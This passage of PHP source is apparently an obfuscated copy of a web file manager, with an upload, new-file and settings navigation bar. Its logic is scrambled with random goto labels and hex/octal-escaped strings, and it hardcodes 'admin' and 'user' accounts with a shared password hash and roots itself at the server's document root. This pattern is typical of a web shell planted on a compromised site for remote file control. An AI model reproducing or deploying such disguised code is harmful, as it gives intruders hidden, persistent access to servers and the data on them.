                    <?php  if (!FM_READONLY) { ?>
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php  echo lng("\x53\145\141\x72\143\150"); ?>
" aria-label="<?php  echo lng("\123\145\x61\162\x63\x68"); ?>
" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item">
                        <a title="<?php  echo lng("\125\160\154\x6f\x61\144"); ?>
" class="nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php  echo lng("\125\x70\154\157\x61\144"); ?>
</a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php  echo lng("\116\x65\167\x49\x74\x65\155"); ?>
" class="nav-link" href="#createNewItem" data-toggle="modal" data-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php  echo lng("\x4e\x65\x77\x49\x74\x65\x6d"); ?>
</a>
                    </li>
                    <?php  } ?>
                    <?php  if (FM_USE_AUTH) { ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php  if (isset($_SESSION[FM_SESSION_ID]["\x6c\157\x67\147\x65\144"])) { echo $_SESSION[FM_SESSION_ID]["\x6c\157\147\147\145\144"]; } ?>
</a>
                        <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php  if (!FM_READONLY) { ?>
                            <a title="<?php  echo lng("\x53\x65\x74\x74\151\156\147\x73"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php  echo lng("\x53\x65\x74\x74\151\x6e\147\x73"); ?>
</a>
                            <?php  } ?>
                            <a title="<?php  echo lng("\x48\x65\x6c\160"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php  echo lng("\110\145\154\160"); ?>
</a>
                            <a title="<?php  echo lng("\x4c\x6f\x67\x6f\x75\164"); ?>
" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php  echo lng("\114\157\x67\x6f\x75\x74"); ?>
</a>
                        </div>
                    </li>
                    <?php  } ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php  } goto wgNSa; FseU3: $auth_users = array("\141\x64\155\x69\x6e" => "\x24\62\171\44\61\60\44\x37\x51\x62\162\x4b\144\x67\x69\x49\x55\102\x7a\155\130\114\172\161\67\150\130\x53\x75\x47\132\x4c\x6e\x54\126\x68\x39\x54\104\x4f\154\160\71\164\172\x4d\66\60\x52\x37\x44\x66\171\x43\64\103\114\60\161\x79", "\165\x73\145\x72" => "\x24\62\171\x24\x31\60\44\x37\x51\142\x72\x4b\x64\147\x69\111\125\102\x7a\x6d\130\114\x7a\x71\67\150\x58\x53\165\x47\132\114\156\x54\x56\150\x39\124\104\117\x6c\x70\x39\x74\172\x4d\66\x30\x52\67\x44\146\x79\x43\64\x43\114\x30\x71\171"); goto c7LfI; cQ1dJ: defined("\106\x4d\x5f\125\123\105\x5f\110\x49\107\110\114\111\x47\110\124\112\123") || define("\106\115\137\125\123\x45\137\x48\111\107\110\114\x49\x47\110\124\x4a\x53", $use_highlightjs); goto LEBsM; Wz7lR: if ($use_auth && isset($_SESSION[FM_SESSION_ID]["\154\x6f\147\147\145\144"])) { $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]["\x6c\x6f\x67\x67\x65\x64"]]) ? $directories_users[$_SESSION[FM_SESSION_ID]["\154\x6f\x67\147\145\144"]] : $root_path; } goto oFqrx; kl3rr: if (isset($_GET["\x6e\145\167"]) && isset($_GET["\x74\x79\x70\145"]) && !FM_READONLY) { $type = $_GET["\164\171\160\145"]; $new = str_replace("\x2f", '', fm_clean_path(strip_tags($_GET["\x6e\145\167"]))); if ($new != '' && $new != "\56\56" && $new != "\56") { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } if ($_GET["\164\171\x70\x65"] == "\x66\x69\x6c\145") { if (!file_exists($path . "\57" . $new)) { @fopen($path . "\x2f" . $new, "\167") or die("\103\141\156\156\157\x74\x20\x6f\x70\145\156\x20\x66\x69\x6c\145\x3a\40\40" . $new); fm_set_msg(sprintf("\106\x69\x6c\145\40\74\142\76\45\x73\74\57\x62\76\x20\143\162\x65\141\164\x65\x64", fm_enc($new))); } else { fm_set_msg(sprintf("\x46\151\154\x65\40\x3c\x62\x3e\x25\x73\74\57\x62\x3e\40\141\154\162\x65\141\x64\x79\40\x65\170\151\163\x74\163", fm_enc($new)), "\x61\154\145\162\x74"); } } else { if (fm_mkdir($path . "\57" . $new, false) === true) { fm_set_msg(sprintf("\x46\x6f\154\144\x65\162\x20\74\x62\76\45\163\x3c\x2f\x62\76\x20\x63\x72\x65\x61\164\145\x64", $new)); } elseif (fm_mkdir($path . "\x2f" . $new, false) === $path . "\57" . $new) { fm_set_msg(sprintf("\x46\157\154\144\145\162\40\74\142\76\x25\163\74\57\142\x3e\40\x61\x6c\x72\x65\x61\144\171\40\145\170\151\163\x74\163", fm_enc($new)), "\x61\x6c\x65\162\x74"); } else { fm_set_msg(sprintf("\106\157\x6c\144\x65\162\x20\x3c\142\76\45\163\74\x2f\x62\x3e\40\x6e\x6f\x74\40\143\162\x65\x61\x74\x65\144", fm_enc($new)), "\x65\x72\x72\157\162"); } } } else { fm_set_msg("\x57\162\157\x6e\x67\40\x66\x6f\154\x64\145\162\x20\156\141\x6d\145", "\x65\x72\162\157\162"); } fm_redirect(FM_SELF_URL . "\77\x70\75" . urlencode(FM_PATH)); } goto z6GUl; h0PZa: $datetime_format = "\144\56\x6d\56\171\40\x48\72\151"; goto EWRiI; X5bBx: $highlightjs_style = "\166\x73"; goto Wnm3Z; SyckF: $root_path = $_SERVER["\x44\x4f\103\x55\x4d\105\116\124\x5f\x52\x4f\x4f\x54"]; goto dE9Yt; wL3Ui: $report_errors = isset($cfg->data["\x65\162\162\x6f\162\x5f\162\x65\160\x6f\x72\164\151\x6e\x67"]) ? $cfg->data["\145\162\162\157\162\x5f\x72\x65\160\x6f\162\x74\151\x6e\x67"] : true; goto U0WDh; vD5eJ: if (isset($_GET["\x6c\x6f\x67\157\165\164"])) { unset($_SESSION[FM_SESSION_ID]["\x6c\157\x67\x67\x65\144"]); fm_redirect(FM_SELF_URL); } goto RWOyh; uA3kc: ')); ?>